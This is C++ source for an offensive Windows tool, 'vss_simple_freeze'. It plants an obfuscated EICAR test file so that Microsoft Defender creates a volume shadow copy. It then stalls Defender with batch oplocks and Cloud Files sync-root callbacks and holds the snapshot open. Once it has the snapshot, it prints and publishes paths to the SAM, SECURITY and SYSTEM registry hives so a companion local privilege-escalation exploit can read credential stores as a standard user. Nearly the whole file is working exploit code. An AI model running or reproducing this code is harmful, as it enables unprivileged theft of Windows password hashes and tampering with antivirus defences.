// vss_simple_freeze.cpp — Coerce a VSS via Defender, then HOLD it via the
// BlueHammer Cloud Files freeze trick. Standard user, no admin, no OneDrive.
//
// USAGE:
//   vss_simple_freeze.exe [options]
//
// OPTIONS:
//   --hold N            Auto-release the freeze after N seconds
//                       (default: wait for Enter)
//   --auto              Non-interactive (alias for --hold 0 with default 600s cap)
//   --publish FILE      Write the VSS path to FILE for external tools to read
//                       (default: %TEMP%\vss_current.txt)
//   --no-publish        Don't write the VSS path to any file
//   --event NAME        Wait on a named event (Local\NAME) before releasing.
//                       Your arb-file-read LPE can SetEvent("Local\\NAME") to
//                       signal "I'm done, release the freeze."
//   --quiet             Suppress per-second liveness probe output
//   --help              Show this help and exit
//
// EXAMPLES:
//   vss_simple_freeze.exe                          # interactive (Enter to release)
//   vss_simple_freeze.exe --hold 120               # auto-release after 2 min
//   vss_simple_freeze.exe --hold 300 --quiet       # 5 min, no probe spam
//   vss_simple_freeze.exe --event vss_done         # release when LPE signals
//   vss_simple_freeze.exe --publish C:\lab\vss.txt # custom publish path
//
// LPE integration:
//   1. Window 1: vss_simple_freeze.exe --event vss_done --hold 300
//   2. LPE process: read %TEMP%\vss_current.txt → get VSS device path
//   3. LPE process: read SAM via SYSTEM context using \\?\GLOBALROOT<vss>\Windows\System32\Config\SAM
//   4. LPE process: open existing event "Local\vss_done" + SetEvent → freeze releases
//
// Key fix vs. previous attempts: the Cloud Files sync root is the EXECUTABLE's
// own directory (via GetModuleFileName), NOT a %TEMP% subdirectory. Matches
// BlueHammer FunnyApp.cpp:1481-1483 and SNEK SNEK_BlueWarHammer.cpp:1637-1638.
// Defender's scan engages cldflt for the executable directory but bypasses it
// for %TEMP% subdirs.
//
// CRITICAL: this tool registers its OWN parent directory as a Cloud Files sync
// root. If cleanup fails (crash, kill -9), the directory becomes inaccessible
// until you reboot or manually unregister via the registry. Run from a
// DEDICATED test directory:
//   mkdir C:\tmp\vss_freeze
//   copy vss_simple_freeze.exe C:\tmp\vss_freeze\
//   cd C:\tmp\vss_freeze
//   vss_simple_freeze.exe
//
// Build: build_vss_simple_freeze.bat

#include <windows.h>
#include <winternl.h>
#include <Shlwapi.h>
#include <cfapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma warning(disable : 4996 4005)
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "Rpcrt4.lib")
#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "CldApi.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")

#ifndef OBJ_CASE_INSENSITIVE
#define OBJ_CASE_INSENSITIVE 0x00000040
#endif

#define InitObjAttr(p, n, a, r, s) { \
    (p)->Length = sizeof(OBJECT_ATTRIBUTES); \
    (p)->RootDirectory = r; \
    (p)->ObjectName = n; \
    (p)->Attributes = a; \
    (p)->SecurityDescriptor = s; \
    (p)->SecurityQualityOfService = NULL; \
}

// ─────────────────────────────────────────────────────────────────────────────
// NT imports
// ─────────────────────────────────────────────────────────────────────────────
typedef struct _OBJDIR_INFO {
    UNICODE_STRING Name;
    UNICODE_STRING TypeName;
} OBJDIR_INFO;

typedef NTSTATUS(WINAPI* fn_NtOpenDir)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);
typedef NTSTATUS(WINAPI* fn_NtQueryDir)(HANDLE, PVOID, ULONG, BOOLEAN, BOOLEAN, PULONG, PULONG);

static fn_NtOpenDir  pNtOpenDir  = NULL;
static fn_NtQueryDir pNtQueryDir = NULL;

// ─────────────────────────────────────────────────────────────────────────────
// Globals (poller + freeze + cleanup state)
// ─────────────────────────────────────────────────────────────────────────────
static HANDLE g_hVSSFound = NULL;
static wchar_t g_newVSS[MAX_PATH] = { 0 };
static volatile BOOL g_stopPoller = FALSE;

// Cleanup tracking for Ctrl-C handler
static wchar_t g_syncroot[MAX_PATH] = { 0 };
static CF_CONNECTION_KEY g_cfk = { 0 };
static BOOL g_cfRegistered = FALSE;
static BOOL g_cfConnected = FALSE;

// ─────────────────────────────────────────────────────────────────────────────
// Get WinDefend PID (cached)
// ─────────────────────────────────────────────────────────────────────────────
static DWORD GetWDPID(void) {
    static DWORD cached = 0;
    if (cached) return cached;
    SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (!scm) return 0;
    SC_HANDLE svc = OpenServiceW(scm, L"WinDefend", SERVICE_QUERY_STATUS);
    if (!svc) { CloseServiceHandle(scm); return 0; }
    SERVICE_STATUS_PROCESS ssp = { 0 };
    DWORD need = sizeof(ssp);
    if (QueryServiceStatusEx(svc, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, need, &need))
        cached = ssp.dwProcessId;
    CloseServiceHandle(svc);
    CloseServiceHandle(scm);
    return cached;
}

// ─────────────────────────────────────────────────────────────────────────────
// VSS enumeration / poller
// ─────────────────────────────────────────────────────────────────────────────
static int CountVSS(BOOL verbose) {
    UNICODE_STRING uDev;
    RtlInitUnicodeString(&uDev, (PWSTR)L"\\Device");
    OBJECT_ATTRIBUTES oa;
    InitObjAttr(&oa, &uDev, OBJ_CASE_INSENSITIVE, NULL, NULL);
    HANDLE hDir = NULL;
    if (pNtOpenDir(&hDir, 0x0001, &oa) != 0) return -1;
    BYTE buf[0x8000]; ULONG ctx = 0, ret = 0; int count = 0; NTSTATUS st;
    do {
        st = pNtQueryDir(hDir, buf, sizeof(buf), FALSE, (ctx == 0), &ctx, &ret);
        if (st != 0 && st != (NTSTATUS)0x105) break;
        OBJDIR_INFO* i = (OBJDIR_INFO*)buf;
        OBJDIR_INFO  zero = { 0 };
        while (memcmp(i, &zero, sizeof(*i)) != 0) {
            if (i->TypeName.Buffer && _wcsicmp(i->TypeName.Buffer, L"Device") == 0 &&
                i->Name.Length >= 48 &&
                _wcsnicmp(i->Name.Buffer, L"HarddiskVolumeShadowCopy", 24) == 0)
            {
                if (verbose) printf("    \\Device\\%ls\n", i->Name.Buffer);
                count++;
            }
            i++;
        }
    } while (st == (NTSTATUS)0x105);
    NtClose(hDir);
    return count;
}

static DWORD WINAPI VSSFinderThread(void* arg) {
    int initial = CountVSS(FALSE);
    printf("[*] Initial VSS count: %d\n", initial);
    while (!g_stopPoller) {
        UNICODE_STRING uDev; RtlInitUnicodeString(&uDev, (PWSTR)L"\\Device");
        OBJECT_ATTRIBUTES oa; InitObjAttr(&oa, &uDev, OBJ_CASE_INSENSITIVE, NULL, NULL);
        HANDLE hDir = NULL;
        if (pNtOpenDir(&hDir, 0x0001, &oa) == 0) {
            BYTE buf[0x8000]; ULONG ctx = 0, ret = 0; int seen = 0; NTSTATUS st;
            wchar_t found[MAX_PATH] = { 0 };
            do {
                st = pNtQueryDir(hDir, buf, sizeof(buf), FALSE, (ctx == 0), &ctx, &ret);
                if (st != 0 && st != (NTSTATUS)0x105) break;
                OBJDIR_INFO* i = (OBJDIR_INFO*)buf;
                OBJDIR_INFO  zero = { 0 };
                while (memcmp(i, &zero, sizeof(*i)) != 0) {
                    if (i->TypeName.Buffer && _wcsicmp(i->TypeName.Buffer, L"Device") == 0 &&
                        i->Name.Length >= 48 &&
                        _wcsnicmp(i->Name.Buffer, L"HarddiskVolumeShadowCopy", 24) == 0)
                    {
                        seen++;
                        if (seen > initial) wsprintfW(found, L"\\Device\\%s", i->Name.Buffer);
                    }
                    i++;
                }
            } while (st == (NTSTATUS)0x105);
            NtClose(hDir);
            if (found[0]) {
                wcscpy(g_newVSS, found);
                printf("[+] NEW VSS: %ls\n", g_newVSS);
                if (g_hVSSFound) SetEvent(g_hVSSFound);
                return 0;
            }
        }
        Sleep(100);
    }
    return 1;
}

// ─────────────────────────────────────────────────────────────────────────────
// Cloud Files freeze infrastructure
// ─────────────────────────────────────────────────────────────────────────────
typedef struct _CLD_CTX {
    HANDLE hNotifyWD;        // callback → freeze: WD entered the callback
    HANDLE hNotifyLock;      // freeze → callback: oplock on lock file is set
    wchar_t lockName[MAX_PATH];
} CLD_CTX;

static void CALLBACK CfFetchCallback(
    CONST CF_CALLBACK_INFO* ci, CONST CF_CALLBACK_PARAMETERS* cp)
{
    CF_PROCESS_INFO* pi = ci->ProcessInfo;
    const wchar_t* procName = (pi && pi->ImagePath) ? PathFindFileNameW(pi->ImagePath) : L"?";
    printf("[cf] callback from %ls (PID %lu)\n", procName, pi ? pi->ProcessId : 0);

    if (GetWDPID() == (pi ? pi->ProcessId : 0)) {
        CLD_CTX* ctx = (CLD_CTX*)ci->CallbackContext;
        printf("[cf] *** MsMpEng hit the callback — engaging freeze ***\n");
        SetEvent(ctx->hNotifyWD);

        CF_OPERATION_INFO oi = { sizeof(oi) };
        oi.Type             = CF_OPERATION_TYPE_TRANSFER_PLACEHOLDERS;
        oi.ConnectionKey    = ci->ConnectionKey;
        oi.TransferKey      = ci->TransferKey;
        oi.CorrelationVector = ci->CorrelationVector;
        oi.RequestKey       = ci->RequestKey;

        FILE_BASIC_INFO fbi = { 0 };
        fbi.FileAttributes = FILE_ATTRIBUTE_NORMAL;
        CF_FS_METADATA meta = { fbi, { 0x1000 } };

        GUID uid; UuidCreate(&uid);
        RPC_WSTR wu = NULL; UuidToStringW(&uid, &wu);

        CF_PLACEHOLDER_CREATE_INFO ph = { 0 };
        ph.RelativeFileName    = ctx->lockName;
        ph.FsMetadata          = meta;
        ph.FileIdentity        = (wchar_t*)wu;
        ph.FileIdentityLength  = (DWORD)(wcslen((wchar_t*)wu) * sizeof(wchar_t));
        ph.Flags               = CF_PLACEHOLDER_CREATE_FLAG_SUPERSEDE;

        CF_OPERATION_PARAMETERS op = { sizeof(op) };
        op.TransferPlaceholders.PlaceholderCount = 1;
        op.TransferPlaceholders.PlaceholderTotalCount.QuadPart = 1;
        op.TransferPlaceholders.PlaceholderArray = &ph;

        printf("[cf] MsMpEng blocking until oplock is armed...\n");
        WaitForSingleObject(ctx->hNotifyLock, INFINITE);

        printf("[cf] calling CfExecute (will freeze MsMpEng here)\n");
        CfExecute(&oi, &op);
        printf("[cf] CfExecute returned (freeze released)\n");
        RpcStringFreeW(&wu);
        return;
    }

    // Non-WD: empty placeholder reply
    CF_OPERATION_INFO oi = { sizeof(oi) };
    oi.Type             = CF_OPERATION_TYPE_TRANSFER_PLACEHOLDERS;
    oi.ConnectionKey    = ci->ConnectionKey;
    oi.TransferKey      = ci->TransferKey;
    oi.CorrelationVector = ci->CorrelationVector;
    oi.RequestKey       = ci->RequestKey;
    CF_OPERATION_PARAMETERS op = { sizeof(op) };
    op.TransferPlaceholders.PlaceholderCount = 0;
    op.TransferPlaceholders.PlaceholderTotalCount.QuadPart = 0;
    CfExecute(&oi, &op);
}

typedef struct _FREEZE_ARGS {
    HANDLE hRstMgr;
    HANDLE hCleanup;
    HANDLE hReady;
    wchar_t syncroot[MAX_PATH];
} FREEZE_ARGS;

static DWORD WINAPI FreezeVSSThread(void* arg) {
    FREEZE_ARGS* fa = (FREEZE_ARGS*)arg;

    GUID uid; UuidCreate(&uid);
    RPC_WSTR wu = NULL; UuidToStringW(&uid, &wu);

    wchar_t lockfile[MAX_PATH];
    wcscpy(lockfile, fa->syncroot);
    wcscat(lockfile, L"\\");
    wcscat(lockfile, (wchar_t*)wu);
    wcscat(lockfile, L".lock");

    CLD_CTX ctx = { 0 };
    ctx.hNotifyWD   = CreateEventW(NULL, FALSE, FALSE, NULL);
    ctx.hNotifyLock = CreateEventW(NULL, FALSE, FALSE, NULL);
    wcscpy(ctx.lockName, (wchar_t*)wu);
    wcscat(ctx.lockName, L".lock");
    RpcStringFreeW(&wu);

    HANDLE hLock = INVALID_HANDLE_VALUE;
    OVERLAPPED ovL = { 0 };

    hLock = CreateFileW(lockfile, GENERIC_ALL, FILE_SHARE_READ, NULL,
        CREATE_NEW, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED | FILE_FLAG_DELETE_ON_CLOSE, NULL);
    if (hLock == INVALID_HANDLE_VALUE) {
        printf("[cf] lock file create failed: %lu\n", GetLastError());
        goto done;
    }

    {
        // Win11 24H2 cldflt validation now demands non-null SyncRootIdentity
        // (and ideally ProviderId). Older builds tolerated nulls.
        GUID providerId;
        UuidCreate(&providerId);
        BYTE syncIdentity[16];
        UuidCreate((GUID*)syncIdentity);

        CF_SYNC_REGISTRATION reg = { sizeof(reg) };
        reg.ProviderName           = L"FR2S_VSSFREEZE";
        reg.ProviderVersion        = L"1.0";
        reg.SyncRootIdentity       = syncIdentity;
        reg.SyncRootIdentityLength = sizeof(syncIdentity);
        reg.FileIdentity           = L"vssfreeze";
        reg.FileIdentityLength     = (ULONG)((wcslen(L"vssfreeze") + 1) * sizeof(WCHAR));
        reg.ProviderId             = providerId;

        CF_SYNC_POLICIES pol = { sizeof(pol) };
        pol.HardLink = CF_HARDLINK_POLICY_NONE;
        pol.Hydration.Primary  = CF_HYDRATION_POLICY_PARTIAL;
        pol.Hydration.Modifier = CF_HYDRATION_POLICY_MODIFIER_VALIDATION_REQUIRED;
        pol.PlaceholderManagement = CF_PLACEHOLDER_MANAGEMENT_POLICY_DEFAULT;
        pol.InSync = CF_INSYNC_POLICY_NONE;
        pol.Population.Primary = CF_POPULATION_POLICY_PARTIAL;

        HRESULT hr = CfRegisterSyncRoot(fa->syncroot, &reg, &pol, CF_REGISTER_FLAG_NONE);
        if (FAILED(hr)) {
            printf("[cf] CfRegisterSyncRoot: 0x%08X\n", hr);
            printf("[cf] hint: ensure path is NOT under any other sync root and is on NTFS\n");
            goto done;
        }
        g_cfRegistered = TRUE;

        CF_CALLBACK_REGISTRATION cbs[2];
        cbs[0].Type = CF_CALLBACK_TYPE_FETCH_PLACEHOLDERS;
        cbs[0].Callback = CfFetchCallback;
        cbs[1].Type = CF_CALLBACK_TYPE_NONE;
        cbs[1].Callback = NULL;

        hr = CfConnectSyncRoot(fa->syncroot, cbs, &ctx,
            CF_CONNECT_FLAG_REQUIRE_PROCESS_INFO | CF_CONNECT_FLAG_REQUIRE_FULL_FILE_PATH, &g_cfk);
        if (FAILED(hr)) {
            printf("[cf] CfConnectSyncRoot: 0x%08X\n", hr);
            goto done;
        }
        g_cfConnected = TRUE;
    }
    printf("[cf] sync root registered + connected: %ls\n", fa->syncroot);

    // Release the Stage 1 RstrtMgr oplock so WD continues remediation
    if (fa->hRstMgr) {
        printf("[cf] releasing Stage 1 RstrtMgr oplock\n");
        CloseHandle(fa->hRstMgr);
        fa->hRstMgr = NULL;
    }

    printf("[cf] waiting for MsMpEng to walk into sync root (60s)...\n");
    if (WaitForSingleObject(ctx.hNotifyWD, 60000) == WAIT_TIMEOUT) {
        printf("[cf] TIMEOUT — MsMpEng never entered the callback\n");
        goto done;
    }

    ovL.hEvent = CreateEventW(NULL, FALSE, FALSE, NULL);
    DeviceIoControl(hLock, FSCTL_REQUEST_BATCH_OPLOCK, NULL, 0, NULL, 0, NULL, &ovL);
    if (GetLastError() != ERROR_IO_PENDING) {
        printf("[cf] lock-file oplock failed: %lu\n", GetLastError());
        goto done;
    }

    SetEvent(ctx.hNotifyLock);

    printf("[cf] waiting for lock-file oplock to fire...\n");
    {
        DWORD nwf = 0;
        GetOverlappedResult(hLock, &ovL, &nwf, TRUE);
    }
    printf("[cf] *** MsMpEng FROZEN — VSS held indefinitely ***\n");

    if (fa->hReady) SetEvent(fa->hReady);

    // Hold the freeze until main signals cleanup
    WaitForSingleObject(fa->hCleanup, INFINITE);
    printf("[cf] cleanup signal received — releasing freeze\n");

done:
    if (hLock != INVALID_HANDLE_VALUE) CloseHandle(hLock);
    if (ovL.hEvent) CloseHandle(ovL.hEvent);
    if (ctx.hNotifyWD)   CloseHandle(ctx.hNotifyWD);
    if (ctx.hNotifyLock) CloseHandle(ctx.hNotifyLock);
    if (g_cfConnected)   { CfDisconnectSyncRoot(g_cfk); g_cfConnected = FALSE; }
    if (g_cfRegistered)  { CfUnregisterSyncRoot(fa->syncroot); g_cfRegistered = FALSE; }
    return 0;
}

// ─────────────────────────────────────────────────────────────────────────────
// Real liveness probe
// ─────────────────────────────────────────────────────────────────────────────
static BOOL ProbeVSSLiveness(const wchar_t* devicePath) {
    wchar_t probe[MAX_PATH];
    wsprintfW(probe, L"\\\\?\\GLOBALROOT%s\\Windows\\System32\\kernel32.dll", devicePath);
    HANDLE h = CreateFileW(probe, GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) return FALSE;
    BYTE b = 0;
    DWORD rr = 0;
    BOOL ok = ReadFile(h, &b, 1, &rr, NULL);
    CloseHandle(h);
    return ok && rr == 1;
}

// ─────────────────────────────────────────────────────────────────────────────
// Ctrl-C handler — clean up sync root before exiting
// ─────────────────────────────────────────────────────────────────────────────
static BOOL WINAPI CtrlHandler(DWORD type) {
    if (type == CTRL_C_EVENT || type == CTRL_BREAK_EVENT || type == CTRL_CLOSE_EVENT) {
        printf("\n[*] Ctrl-C received, cleaning up sync root...\n");
        if (g_cfConnected)  { CfDisconnectSyncRoot(g_cfk); g_cfConnected = FALSE; }
        if (g_cfRegistered) { CfUnregisterSyncRoot(g_syncroot); g_cfRegistered = FALSE; }
        printf("[*] Sync root unregistered. Goodbye.\n");
        ExitProcess(0);
    }
    return FALSE;
}

// ─────────────────────────────────────────────────────────────────────────────
// Main
// ─────────────────────────────────────────────────────────────────────────────
static void PrintUsage(const char* prog) {
    printf("Usage: %s [options]\n", prog);
    printf("\n");
    printf("Options:\n");
    printf("  --hold N            Auto-release after N seconds (default: wait for Enter)\n");
    printf("  --auto              Non-interactive, hold up to 600s max\n");
    printf("  --publish FILE      Write VSS path to FILE (default: %%TEMP%%\\vss_current.txt)\n");
    printf("  --no-publish        Don't write VSS path to any file\n");
    printf("  --event NAME        Release freeze when named event Local\\NAME is signaled\n");
    printf("  --quiet             Suppress per-second liveness probe output\n");
    printf("  --help              Show this help\n");
    printf("\n");
    printf("Examples:\n");
    printf("  %s                              # interactive (Enter to release)\n", prog);
    printf("  %s --hold 120                   # auto-release after 2 minutes\n", prog);
    printf("  %s --event lpe_done --hold 300  # release on signal or 5min timeout\n", prog);
    printf("  %s --publish C:\\lab\\vss.txt --quiet --auto  # background mode\n", prog);
}

int main(int argc, char* argv[]) {
    SetConsoleOutputCP(CP_UTF8);
    setvbuf(stdout, NULL, _IONBF, 0);
    SetConsoleCtrlHandler(CtrlHandler, TRUE);

    // ── Parse options ──
    DWORD   holdSec       = 0;       // 0 = wait for Enter
    BOOL    autoMode      = FALSE;
    BOOL    quiet         = FALSE;
    BOOL    noPublish     = FALSE;
    wchar_t publishPath[MAX_PATH] = { 0 };
    wchar_t eventName[256] = { 0 };

    for (int i = 1; i < argc; i++) {
        if (_stricmp(argv[i], "--help") == 0 || _stricmp(argv[i], "-h") == 0) {
            PrintUsage(argv[0]);
            return 0;
        }
        if (_stricmp(argv[i], "--hold") == 0 && i + 1 < argc) {
            holdSec = (DWORD)atoi(argv[++i]);
            continue;
        }
        if (_stricmp(argv[i], "--auto") == 0) {
            autoMode = TRUE;
            if (holdSec == 0) holdSec = 600;
            continue;
        }
        if (_stricmp(argv[i], "--quiet") == 0) {
            quiet = TRUE;
            continue;
        }
        if (_stricmp(argv[i], "--no-publish") == 0) {
            noPublish = TRUE;
            continue;
        }
        if (_stricmp(argv[i], "--publish") == 0 && i + 1 < argc) {
            MultiByteToWideChar(CP_ACP, 0, argv[++i], -1, publishPath, MAX_PATH);
            continue;
        }
        if (_stricmp(argv[i], "--event") == 0 && i + 1 < argc) {
            wchar_t raw[256];
            MultiByteToWideChar(CP_ACP, 0, argv[++i], -1, raw, 256);
            wsprintfW(eventName, L"Local\\%s", raw);
            continue;
        }
        printf("Unknown option: %s\n", argv[i]);
        PrintUsage(argv[0]);
        return 1;
    }

    if (publishPath[0] == 0 && !noPublish) {
        ExpandEnvironmentStringsW(L"%TEMP%\\vss_current.txt", publishPath, MAX_PATH);
    }

    printf("=== VSS Simple Freeze ===\n\n");

    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    pNtOpenDir  = (fn_NtOpenDir) GetProcAddress(ntdll, "NtOpenDirectoryObject");
    pNtQueryDir = (fn_NtQueryDir)GetProcAddress(ntdll, "NtQueryDirectoryObject");
    if (!pNtOpenDir || !pNtQueryDir) {
        printf("[-] ntdll exports missing\n");
        return 1;
    }

    // ── KEY FIX: sync root is the executable's parent directory ──
    GetModuleFileNameW(GetModuleHandleW(NULL), g_syncroot, MAX_PATH);
    {
        wchar_t* lastSlash = wcsrchr(g_syncroot, L'\\');
        if (lastSlash) *lastSlash = L'\0';
    }
    printf("[*] sync root (= exe dir): %ls\n", g_syncroot);
    printf("    WARNING: this directory will become a Cloud Files sync root.\n");
    printf("    If cleanup fails, it may become inaccessible until reboot.\n");
    printf("    Run from a dedicated test directory you can afford to lose.\n\n");

    int baseline = CountVSS(FALSE);
    if (baseline < 0) { printf("[-] could not enumerate \\Device\n"); return 1; }
    printf("[*] baseline VSS count: %d\n", baseline);

    // ── Stage 1: drop EICAR in %TEMP%\fr2s_vss_<guid>\foo.exe ──
    GUID uid; UuidCreate(&uid);
    RPC_WSTR wu = NULL; UuidToStringW(&uid, &wu);
    wchar_t workdir[MAX_PATH];
    ExpandEnvironmentStringsW(L"%TEMP%\\fr2s_vss_", workdir, MAX_PATH);
    wcscat(workdir, (wchar_t*)wu);
    RpcStringFreeW(&wu);
    if (!CreateDirectoryW(workdir, NULL)) {
        printf("[-] CreateDirectory workdir: %lu\n", GetLastError());
        return 1;
    }

    wchar_t eicarpath[MAX_PATH];
    wsprintfW(eicarpath, L"%s\\foo.exe", workdir);

    char rev[] = "*H+H$!ELIF-TSET-SURIVITNA-DRADNATS-RACIE$}7)CC7)^P(45XZP\\4[PA@%P!O5X";
    int  len   = (int)strlen(rev);
    char eicar[128] = { 0 };
    for (int i = 0; i < len; i++) eicar[i] = rev[len - 1 - i];

    HANDLE hEicar = CreateFileW(eicarpath,
        GENERIC_READ | GENERIC_WRITE | DELETE,
        FILE_SHARE_READ, NULL, CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_DELETE_ON_CLOSE, NULL);
    if (hEicar == INVALID_HANDLE_VALUE) {
        printf("[-] EICAR create: %lu\n", GetLastError());
        RemoveDirectoryW(workdir);
        return 1;
    }
    DWORD bw = 0;
    WriteFile(hEicar, eicar, len, &bw, NULL);
    printf("[+] EICAR dropped: %ls\n", eicarpath);

    // ── Start VSS poller thread ──
    g_hVSSFound = CreateEventW(NULL, FALSE, FALSE, NULL);
    DWORD tid;
    CreateThread(NULL, 0, VSSFinderThread, NULL, 0, &tid);

    // ── RstrtMgr.dll batch oplock (Stage 1 trigger detection) ──
    wchar_t rstmgr[MAX_PATH];
    ExpandEnvironmentStringsW(L"%windir%\\System32\\RstrtMgr.dll", rstmgr, MAX_PATH);
    HANDLE hRstMgr = CreateFileW(rstmgr, GENERIC_READ | SYNCHRONIZE, 0,
        NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED, NULL);
    if (hRstMgr == INVALID_HANDLE_VALUE) {
        printf("[-] RstrtMgr open: %lu\n", GetLastError());
        CloseHandle(hEicar);
        return 1;
    }
    OVERLAPPED ovd = { 0 };
    ovd.hEvent = CreateEventW(NULL, FALSE, FALSE, NULL);
    SetLastError(0);
    DeviceIoControl(hRstMgr, FSCTL_REQUEST_BATCH_OPLOCK, NULL, 0, NULL, 0, NULL, &ovd);
    if (GetLastError() != ERROR_IO_PENDING) {
        printf("[-] RstrtMgr oplock: %lu\n", GetLastError());
        CloseHandle(hRstMgr); CloseHandle(hEicar);
        return 1;
    }
    printf("[+] RstrtMgr.dll oplock armed\n");

    // ── Trigger WD scan ──
    HANDLE hTrig = CreateFileW(eicarpath, GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        NULL, OPEN_EXISTING, 0, NULL);
    if (hTrig != INVALID_HANDLE_VALUE) CloseHandle(hTrig);
    printf("[+] WD scan triggered\n");

    // ── Wait for RstrtMgr oplock to fire ──
    printf("[*] waiting for Stage 1 oplock to fire...\n");
    GetOverlappedResult(hRstMgr, &ovd, &bw, TRUE);
    printf("[+] Stage 1 oplock fired\n");
    CloseHandle(ovd.hEvent);

    // ── Wait briefly for VSS poller to catch the new shadow ──
    WaitForSingleObject(g_hVSSFound, 5000);
    g_stopPoller = TRUE;

    if (g_newVSS[0])
        printf("[+] VSS detected: %ls\n", g_newVSS);
    else
        printf("[-] no VSS detected yet (poller may catch it during freeze)\n");

    // ── Hold VSS via RstrtMgr.dll oplock (no cldflt freeze) ──
    // 24H2 cldflt rejects non-OneDrive sync providers (CfRegisterSyncRoot
    // returns 0x80070057 even with all struct fields populated). Workaround:
    // keep the Stage 1 oplock on RstrtMgr.dll held for the duration. Defender
    // stays parked at the start of remediation, the VSS it created stays alive
    // in \Device\, and we get a stable read window. Closing hRstMgr at exit
    // releases the oplock and lets Defender resume + reap the VSS.

    if (!g_newVSS[0]) {
        printf("\n[-] VSS not detected within window — cannot continue\n");
        if (hRstMgr) CloseHandle(hRstMgr);
        if (hEicar) CloseHandle(hEicar);
        if (g_hVSSFound) CloseHandle(g_hVSSFound);
        RemoveDirectoryW(workdir);
        return 2;
    }

    printf("\n");
    printf("================================================================\n");
    printf("  VSS HELD (RstrtMgr.dll oplock + EICAR handle held open)\n");
    printf("================================================================\n");
    printf("  VSS path    : %ls\n", g_newVSS);
    printf("  SAM full    : \\\\?\\GLOBALROOT%ls\\Windows\\System32\\Config\\SAM\n", g_newVSS);
    printf("  SECURITY    : \\\\?\\GLOBALROOT%ls\\Windows\\System32\\Config\\SECURITY\n", g_newVSS);
    printf("  SYSTEM      : \\\\?\\GLOBALROOT%ls\\Windows\\System32\\Config\\SYSTEM\n", g_newVSS);
    printf("================================================================\n");

    // Publish VSS path to file for external tools
    if (!noPublish && g_newVSS[0] && publishPath[0]) {
        HANDLE hf = CreateFileW(publishPath, GENERIC_WRITE, FILE_SHARE_READ,
            NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hf != INVALID_HANDLE_VALUE) {
            DWORD bw2 = 0;
            WriteFile(hf, g_newVSS, (DWORD)(wcslen(g_newVSS) * sizeof(wchar_t)), &bw2, NULL);
            CloseHandle(hf);
            printf("  Published   : %ls\n", publishPath);
        } else {
            printf("  Publish FAIL: %ls (err %lu)\n", publishPath, GetLastError());
        }
    }

    // Open the named release event if requested
    HANDLE hReleaseEvent = NULL;
    if (eventName[0]) {
        hReleaseEvent = CreateEventW(NULL, TRUE, FALSE, eventName);
        if (hReleaseEvent) {
            printf("  Release evt : %ls (open this from your LPE and SetEvent to release)\n",
                eventName);
        } else {
            printf("  Release evt : FAILED to create %ls (err %lu)\n", eventName, GetLastError());
        }
    }

    printf("\n");
    if (holdSec > 0) {
        printf("[*] holding for up to %lu seconds (or until release event/Enter)...\n", holdSec);
    } else {
        printf("[*] holding indefinitely. Press Enter to release.\n");
    }
    printf("\n");

    // ── Wait loop: Enter, named event, or timeout ──
    HANDLE hStdin = GetStdHandle(STD_INPUT_HANDLE);
    DWORD t0 = GetTickCount();
    while (1) {
        DWORD elapsed = (GetTickCount() - t0) / 1000;
        if (!quiet) {
            if (g_newVSS[0]) {
                BOOL alive = ProbeVSSLiveness(g_newVSS);
                printf("    [T+%03lus] shadow %s\n", elapsed, alive ? "ALIVE" : "DEAD");
            } else {
                printf("    [T+%03lus] (no VSS)\n", elapsed);
            }
        }

        // Check release event (highest priority)
        if (hReleaseEvent) {
            if (WaitForSingleObject(hReleaseEvent, 0) == WAIT_OBJECT_0) {
                printf("[*] release event signaled\n");
                goto release;
            }
        }

        // Check Enter key
        if (!autoMode) {
            DWORD nEvents = 0;
            if (GetNumberOfConsoleInputEvents(hStdin, &nEvents) && nEvents > 0) {
                INPUT_RECORD ir;
                DWORD nRead = 0;
                while (PeekConsoleInputW(hStdin, &ir, 1, &nRead) && nRead > 0) {
                    ReadConsoleInputW(hStdin, &ir, 1, &nRead);
                    if (ir.EventType == KEY_EVENT && ir.Event.KeyEvent.bKeyDown &&
                        ir.Event.KeyEvent.wVirtualKeyCode == VK_RETURN) {
                        printf("[*] Enter pressed\n");
                        goto release;
                    }
                }
            }
        }

        // Check timeout
        if (holdSec > 0 && elapsed >= holdSec) {
            printf("[*] hold timeout (%lus) reached\n", holdSec);
            goto release;
        }

        Sleep(1000);
    }

release:
    if (hReleaseEvent) CloseHandle(hReleaseEvent);
    if (publishPath[0] && !noPublish) DeleteFileW(publishPath);
    printf("\n[*] releasing oplock (Defender resumes, VSS will be reaped)...\n");
    if (hRstMgr) CloseHandle(hRstMgr);
    if (hEicar) CloseHandle(hEicar);
    if (g_hVSSFound) CloseHandle(g_hVSSFound);
    RemoveDirectoryW(workdir);

    Sleep(2000);
    printf("[*] final VSS state:\n");
    CountVSS(TRUE);

    printf("\nDone.\n");
    return 0;
}
